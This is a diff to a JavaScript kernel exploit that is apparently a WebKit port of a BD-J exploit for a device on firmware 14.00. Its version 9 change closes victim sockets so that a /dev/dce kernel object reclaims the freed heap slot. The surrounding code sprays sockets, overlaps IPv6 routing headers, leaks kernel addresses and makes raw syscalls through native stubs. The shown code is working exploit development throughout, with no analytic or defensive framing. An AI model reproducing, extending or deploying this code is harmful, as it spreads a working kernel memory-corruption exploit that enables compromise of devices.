@@ -3,10 +3,13 @@ import { HX1400_TABLES } from "./hx_tables.js";
 
 // ============================================================================
 // hx_kevent.js — WebKit port of Hx1400.probe() (BD-J) for FW 14.00
-// v8: full CANDS (all 30: multiples of 8..240), phase R reclaim from pc 3198-3505
-//     (IP_DROP_MEMBERSHIP probe 239.255.255.250 kills leftover victims; 248B
-//      RTHDR getsockopt kills leftover spray; then lowest-free-fd probe).
-// v7: fd ceiling adaptation + B1 census/plug. Earlier: x86 stub rescan.
+// v9: A/B grooming — close candidate socket right before open("/dev/dce") so
+//     the dce kernel object lands in the freed victim slot (adjacent to an
+//     armed RTHDR). Needed because WebKit's 256B zone is churned vs BD-J's
+//     pristine app heap. Disable with URL &ab=0. (Bytecode itself does NOT
+//     close — this is an environmental adaptation, not a bytecode port.)
+// v8: full CANDS (30: multiples of 8..240) + phase R reclaim.
+// v7: fd ceiling adaptation + B1 census/plug. v5: x86 stub rescan.
 // ============================================================================
 
 const T = HX1400_TABLES;
@@ -32,11 +35,10 @@ const MAX_TRIES = 32;
 const VICTIM_N = 96;
 const SPRAY_FULL = 144;
 const SPRAY_MIN = 128;
-// FULL Hx1400.CANDS (clinit, 30 entries): every multiple of 8 from 8 to 240
 const CANDS = [];
 for (let i = 1; i <= 30; i++) CANDS.push(i * 8);
 
-const STATE = { ctx: null, kbase: 0n, kva: -1n };
+const STATE = { ctx: null, kbase: 0n, kva: -1n, abClose: true };
 
 function ctx() { return STATE.ctx; }
 function log(tag, detail) { ctx().mark(tag, detail === undefined ? "" : String(detail)); }
@@ -137,7 +139,6 @@ function scn64(name, a, b, c, d, e, f) {
   return ctx().callAddr(stub, [toI64(a || 0), toI64(b || 0), toI64(c || 0), toI64(d || 0), toI64(e || 0), toI64(f || 0)]);
 }
 
-// stat helpers (mode short@0, ino u32@+4, rdev@+0x14)
 const stBuf = () => allocBuf(256);
 function fstatOk(fd, st) { zeroBuf(st); return scn("fstat", fd, st.addr, 0, 0, 0, 0) === 0; }
 function stIno(st) { return st.dv.getUint32(4, true) >>> 0; }
@@ -149,12 +150,10 @@ function mkDev(path) {
   return b;
 }
 
-// ---------- phase R: reclaim leftovers (bytecode pc 3198-3505) ----------
 function phaseR() {
-  // mreq = { 239.255.255.250, 0.0.0.0 } (ip_mreq, 8 bytes)
   const mreq = allocBuf(16);
   zeroBuf(mreq);
-  mreq.dv.setUint32(0, 0xfaffffef, true); // 239.255.255.250 LE
+  mreq.dv.setUint32(0, 0xfaffffef, true);
   mreq.dv.setUint32(4, 0, true);
   const rdb = allocBuf(1024);
   const lenp = allocBuf(8);
@@ -174,16 +173,13 @@ function phaseR() {
       if (scn("close", fd) === 0) sprays++;
     }
   }
-  // lowest free fd probe
   const probe = scn("socket", AF_INET, SOCK_DGRAM, 0);
   let lowest = -1;
   if (probe >= 0) { lowest = probe; scn("close", probe); }
-  log("RECLAIM", "closed vics=" + vics + " sprays=" + sprays + " lowest_free_fd=" + lowest +
-      " (need ~250 below the ~291 ceiling)");
+  log("RECLAIM", "closed vics=" + vics + " sprays=" + sprays + " lowest_free_fd=" + lowest);
   return lowest;
 }
 
-// ---------- B1: dce inode census (fds 3..37) + plug + warm ----------
 function phaseB1(dceDev) {
   const st = stBuf();
   const dceFd = scn("open", dceDev.addr, 2, 0, 0, 0, 0);
@@ -215,7 +211,6 @@ function phaseB1(dceDev) {
   log("B1-WARM", "dce open=" + wfd);
 }
 
-// ---------- B0: anchor + 96 victims ----------
 function phaseB0() {
   const anchor = scn("socket", AF_INET6, SOCK_DGRAM, 0);
   if (anchor <= 0) fin("B0 anchor socket failed");
@@ -232,7 +227,6 @@ function phaseB0() {
   return { anchor, victims, highest };
 }
 
-// ---------- B: adaptive spray ----------
 function phaseBSpray(tpl, baseFd) {
   let n = FD_CEILING - MAX_TRIES - 1 - baseFd;
   if (n > SPRAY_FULL) n = SPRAY_FULL;
@@ -279,7 +273,7 @@ function marked(fd, rdb, lenp) {
          (rdb.dv.getUint32(12, true) >>> 0) === TPL_HI;
 }
 
-// ---------- scan loop ----------
+// ---------- scan loop (v9: A/B close-grooming) ----------
 function phase2Leak(rootKq, fds, dceDev, tpl) {
   const rdb = allocBuf(512);
   const lenp = allocBuf(8);
@@ -291,7 +285,7 @@ function phase2Leak(rootKq, fds, dceDev, tpl) {
 
   for (let attempt = 1; attempt <= 6; attempt++) {
     if (target >= 0 || tries >= MAX_TRIES) break;
-    log("KV-ATTEMPT", attempt + "/6");
+    log("KV-ATTEMPT", attempt + "/6 ab=" + (STATE.abClose ? "1" : "0"));
     for (const fd of fds) disarm(fd);
     for (const fd of fds) rearm(fd, tpl);
     log("KV-REPACKED", "round=" + attempt + " cands=" + CANDS.length);
@@ -299,11 +293,17 @@ function phase2Leak(rootKq, fds, dceDev, tpl) {
     for (let ci = 0; ci < CANDS.length && target < 0 && tries < MAX_TRIES; ci++) {
       const vi = CANDS[ci];
       if (vi >= fds.length) continue;
-      const fd = fds[vi];
+      let fd = fds[vi];
+      if (fd === -1) continue;
       if (!marked(fd, rdb, lenp)) continue;
       if (disarm(fd) !== 0) continue;
+      // v9 A/B: free the candidate's slot so dce's object lands in it
+      if (STATE.abClose) {
+        scn("close", fd);
+        fds[vi] = -1;
+      }
       const dce = scn("open", dceDev.addr, 2, 0, 0, 0, 0);
-      if (dce < 0) { rearm(fd, tpl); continue; }
+      if (dce < 0) continue;
       if (dce >= FD_CEILING) log("KV-CEILING", "dce=" + dce + " >= " + FD_CEILING);
       const page = ((BigInt(dce) & 0xffffn) << 16n) | BigInt(OPS_OFF);
       const pageInt = Number(page & 0xffffffffn) | 0;
@@ -321,6 +321,7 @@ function phase2Leak(rootKq, fds, dceDev, tpl) {
       let joined = 0;
       for (let j = 0; j < fds.length; j++) {
         if (j === vi) continue;
+        if (fds[j] === -1) continue;
         zeroBuf(rdb);
         lenp.dv.setUint32(0, RTH_LEN, true);
         lenp.dv.setUint32(4, 0, true);
@@ -355,7 +356,7 @@ function phase2Leak(rootKq, fds, dceDev, tpl) {
   }
 
   if (kva === -1n)
-    fin("leak scan: no victim held (tries=" + tries + " target=" + target + ") — see KV-PLANT lines");
+    fin("leak scan: no victim held (tries=" + tries + " target=" + target + ") — blind writes missed; try ab=0/1");
   STATE.kva = kva;
   log("KV-KVA", "dce=" + h16(kva) + " page=" + h16(pageVal) + " round=" + savedRound + " cand=" + candIdx);
   return { kva, page: pageVal, targetFd };
@@ -366,7 +367,8 @@ export async function runKevent(c) {
   const kob = c.params && c.params.get ? c.params.get("kbase") : null;
   if (kob) { STATE.kbase = BigInt(kob); log("KEVENT-KBASE-OVERRIDE", h16(STATE.kbase)); }
   else { if (!c.kbase) fin("kbase not provided - run route leak first"); STATE.kbase = num(c.kbase); }
-  log("KEVENT-PORT", "kbase=" + h16(STATE.kbase));
+  STATE.abClose = !(c.params && c.params.get && c.params.get("ab") === "0");
+  log("KEVENT-PORT", "kbase=" + h16(STATE.kbase) + " abClose=" + STATE.abClose);
 
   ensureStubs();
   log("NATIVES", Object.keys(NUM).map((k) => k + "=" + NUM[k] + "@0x" +
